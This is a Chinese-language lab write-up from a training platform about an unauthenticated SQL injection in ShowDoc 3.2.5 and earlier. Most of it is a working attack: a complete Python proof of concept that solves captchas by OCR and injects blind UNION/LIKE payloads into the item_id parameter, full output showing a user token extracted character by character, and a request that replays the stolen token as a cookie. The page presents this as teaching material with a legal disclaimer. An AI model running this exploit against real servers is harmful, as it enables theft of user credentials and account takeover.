# ShowDoc 3.2.5 SQL注入漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | CNVD-2020-26585 |
| **影响版本** | ShowDoc <= 3.2.5 |
| **漏洞类型** | SQL注入 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 8080 |

## 漏洞概述

`ShowDoc` 是一个开源的在线共享文档工具。`ShowDoc <= 3.2.5` 存在一处未授权`SQL`注入漏洞，攻击者可以利用该漏洞窃取保存在`SQLite`数据库中的用户密码和`Token`。

## 漏洞复现

靶机启动后，访问`http://your-ip:8080`即可查看到`ShowDoc`的主页。初始化成功后，使用帐号`showdoc`和密码`123456`登录用户界面：

![ShowDoc主页](https://static.nextcyber.cn/attachments/images/course/task/7e4e549673f54135b546c4703ea78128.png)

靶机是一个`ShowDoc 2.8.2`服务器。一旦一个用户登录进`ShowDoc`，其用户`token`将会被保存在`SQLite`数据库中。相比于获取`hash`后的用户密码，用户`token`是一个更好地选择。

## 漏洞利用

在利用该漏洞前，需要安装`验证码识别库`，因为该漏洞需要每次请求前传入验证验：

```
pip install onnxruntime ddddocr requests
```

然后，执行后面提供的`POC`来获取`token`：

```
python3 poc.py -u http://localhost:8080
```

执行结果：

```
┌──(root㉿nextcyber)-[~]
└─# python3 poc.py -u http://192.168.2.73:8080
欢迎使用ddddocr，本项目专注带动行业内卷，个人博客:wenanzhe.com
训练数据支持来源于:http://146.56.204.113:19199/preview
爬虫框架feapder可快速一键接入，快速开启爬虫之旅：https://github.com/Boris-code/feapder
谷歌reCaptcha验证码 / hCaptcha验证码 / funCaptcha验证码商业级识别接口：https://yescaptcha.com/i/NSwk7i
Current result: f
Current result: fd
Current result: fdd
Current result: fdd0
Current result: fdd0f
Current result: fdd0f3
Current result: fdd0f37
Current result: fdd0f37c
Current result: fdd0f37cb
Current result: fdd0f37cb4
Current result: fdd0f37cb4a
Current result: fdd0f37cb4a6
Current result: fdd0f37cb4a6f
Current result: fdd0f37cb4a6ff
Current result: fdd0f37cb4a6ff2
Current result: fdd0f37cb4a6ff22
Current result: fdd0f37cb4a6ff22c
Current result: fdd0f37cb4a6ff22ce
Current result: fdd0f37cb4a6ff22ce3
Current result: fdd0f37cb4a6ff22ce39
Current result: fdd0f37cb4a6ff22ce39e
Current result: fdd0f37cb4a6ff22ce39eb
Current result: fdd0f37cb4a6ff22ce39ebe
Current result: fdd0f37cb4a6ff22ce39ebe6
Current result: fdd0f37cb4a6ff22ce39ebe62
Current result: fdd0f37cb4a6ff22ce39ebe624
Current result: fdd0f37cb4a6ff22ce39ebe6249
Current result: fdd0f37cb4a6ff22ce39ebe6249c
Current result: fdd0f37cb4a6ff22ce39ebe6249c7
Current result: fdd0f37cb4a6ff22ce39ebe6249c76
Current result: fdd0f37cb4a6ff22ce39ebe6249c769
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c0
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c00
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c0097
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c00975
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a3
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d9
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d94
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d9415
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d94158
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e3
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5d
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dd
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6d
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df7
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df7b
```

抓包发送数据包，测试一下这个`token`是否是合法的：

```
GET /server/index.php?s=/api/user/info HTTP/1.1
Host: 192.168.2.73:8080
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: cookie_token=fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df7b
```

`sql`注入成功。

![测试token](https://static.nextcyber.cn/attachments/images/course/task/7466c263d5f14d5b95047998ec0aadc6.png)

## poc.py

```python
import argparse
import ddddocr
import requests
import onnxruntime
from urllib.parse import urljoin

onnxruntime.set_default_logger_severity(3)
table = '0123456789abcdef'
proxies = {'http': 'http://127.0.0.1:8085'}
ocr = ddddocr.DdddOcr()
ocr.set_ranges(table)


class RetryException(Exception):
    pass


def retry_when_failed(func):
    def retry_func(*args, **kwargs):
        while True:
            try:
                return func(*args, **kwargs)
            except RetryException:
                continue
            except Exception as e:
                raise e

    return retry_func


def generate_captcha(base: str):
    data = requests.get(f"{base}?s=/api/common/createCaptcha").json()
    captcha_id = data['data']['captcha_id']

    response = requests.get(f'{base}?s=/api/common/showCaptcha&captcha_id={captcha_id}')
    data = response.content
    result = ocr.classification(data)
    return captcha_id, result


@retry_when_failed
def exploit_one(base: str, current: str, ch: str) -> str:
    captcha_id, captcha_text = generate_captcha(base)
    data = requests.get(base, params={
        's': '/api/item/pwd',
        'page_id': '0',
        'password': '1',
        'captcha_id': captcha_id,
        'captcha': captcha_text,
        'item_id': f"aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{current}{ch}%' LIMIT 1),1,1,1,1,1,1 FROM user_token; -- "
    }).json()
    if data['error_code'] == 0:
        return ch
    elif data['error_code'] == 10010:
        return ''
    elif data['error_code'] == 10206:
        raise RetryException()
    else:
        print(f'error: {data!r}')
        raise Exception('unknown exception')


def main():
    parser = argparse.ArgumentParser(description='Showdoc 3.2.5 SQL injection')
    parser.add_argument('-u', '--url', type=str, required=True)

    args = parser.parse_args()
    target = urljoin(args.url, '/server/index.php')
    res = ''
    for i in range(64):
        r = ''
        for ch in list(table):
            r = exploit_one(target, res, ch)
            if r:
                res += ch
                break

        print(f'Current result: {res}')
        if not r:
            break


if __name__ == '__main__':
    main()
```

---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/148) 在线实战演练上述漏洞。

---

> ⚠️ **免责声明**：本目录所有内容仅供学习研究使用，请勿用于非法用途。
